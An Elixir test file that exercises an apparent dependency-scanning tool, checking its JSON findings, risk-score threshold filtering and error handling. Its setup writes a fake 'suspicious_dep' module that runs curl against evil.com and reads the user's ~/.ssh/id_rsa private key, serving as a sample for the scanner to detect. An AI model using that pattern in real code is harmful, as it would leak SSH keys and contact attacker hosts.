defmodule VetMcp.E2E.ToolE2ETest do
  use ExUnit.Case, async: true

  alias VetMcp.Tools.{GetSecurityFindings, CheckPackage, DiffPackageVersions}

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_mcp_e2e_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp_dir)

    # Create mix.lock
    lock_content = ~s(%{\n  "clean_dep": {:hex, :clean_dep, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n  "suspicious_dep": {:hex, :suspicious_dep, "0.1.0", "xyz789", [:mix], [], "hexpm", "uvw012"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock_content)

    # Create clean dep
    clean_lib = Path.join([tmp_dir, "deps", "clean_dep", "lib"])
    File.mkdir_p!(clean_lib)

    File.write!(Path.join(clean_lib, "clean.ex"), """
    defmodule Clean do
      def hello, do: :world
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "clean_dep", "mix.exs"]), """
    defmodule CleanDep.MixProject do
      use Mix.Project
      def project, do: [app: :clean_dep, version: "1.0.0"]
    end
    """)

    # Create suspicious dep
    sus_lib = Path.join([tmp_dir, "deps", "suspicious_dep", "lib"])
    File.mkdir_p!(sus_lib)

    File.write!(Path.join(sus_lib, "sus.ex"), ~S"""
    defmodule Suspicious do
      System.cmd("curl", ["https://evil.com"])
      def steal, do: File.read!(Path.expand("~/.ssh/id_rsa"))
    end
    """)

    File.write!(Path.join([tmp_dir, "deps", "suspicious_dep", "mix.exs"]), """
    defmodule SuspiciousDep.MixProject do
      use Mix.Project
      def project, do: [app: :suspicious_dep, version: "0.1.0"]
    end
    """)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{project_path: tmp_dir}
  end

  describe "GetSecurityFindings.execute/2" do
    test "returns {:ok, json} with valid structure", %{project_path: path} do
      assert {:ok, json_string} =
               GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true}, %{})

      assert is_binary(json_string)
      assert {:ok, parsed} = Jason.decode(json_string)

      # Top-level structure
      assert Map.has_key?(parsed, "project_path")
      assert Map.has_key?(parsed, "timestamp")
      assert Map.has_key?(parsed, "summary")
      assert Map.has_key?(parsed, "dependencies")

      assert is_list(parsed["dependencies"])
      assert length(parsed["dependencies"]) == 2
    end

    test "JSON contains findings for suspicious dep", %{project_path: path} do
      {:ok, json_string} =
        GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true}, %{})

      {:ok, parsed} = Jason.decode(json_string)

      sus = Enum.find(parsed["dependencies"], fn d -> d["name"] == "suspicious_dep" end)
      assert sus != nil
      assert length(sus["findings"]) > 0
      assert sus["risk_score"] > 0
    end

    test "threshold filtering reduces returned deps", %{project_path: path} do
      # Baseline: all deps (threshold 0)
      {:ok, json_all} =
        GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true, "threshold" => 0}, %{})

      {:ok, all} = Jason.decode(json_all)
      all_count = length(all["dependencies"])

      # Filtered: only deps with score >= 1
      {:ok, json_filtered} =
        GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true, "threshold" => 1}, %{})

      {:ok, filtered} = Jason.decode(json_filtered)
      filtered_count = length(filtered["dependencies"])

      # clean_dep has score 0, so threshold >= 1 should exclude it
      assert filtered_count < all_count

      # All remaining deps should meet the threshold
      for dep <- filtered["dependencies"] do
        assert dep["risk_score"] >= 1
      end
    end

    test "error for non-existent path" do
      result =
        GetSecurityFindings.execute(
          %{"path" => "/tmp/nonexistent_mcp_e2e_project", "skip_hex" => true},
          %{}
        )

      assert {:error, message} = result
      assert is_binary(message)
      assert message =~ "Scan failed"
    end
  end

  describe "CheckPackage.execute/2" do
    test "returns error for missing package param" do
      assert {:error, message} = CheckPackage.execute(%{}, %{})
      assert message =~ "Missing required parameter"
    end

    test "returns error for empty params" do
      assert {:error, _} = CheckPackage.execute(%{"version" => "1.0.0"}, %{})
    end
  end

  describe "DiffPackageVersions.execute/2" do
    test "returns error for missing params" do
      assert {:error, message} = DiffPackageVersions.execute(%{}, %{})
      assert message =~ "Missing required parameters"
    end

    test "returns error for partial params" do
      assert {:error, _} = DiffPackageVersions.execute(%{"package" => "jason"}, %{})
    end

    test "returns meaningful error for non-existent package versions" do
      result =
        DiffPackageVersions.execute(
          %{"package" => "jason", "from_version" => "0.0.1", "to_version" => "0.0.2"},
          %{}
        )

      # Should return an error (either :version_unavailable or other)
      assert {:error, message} = result
      assert is_binary(message)
    end
  end
end
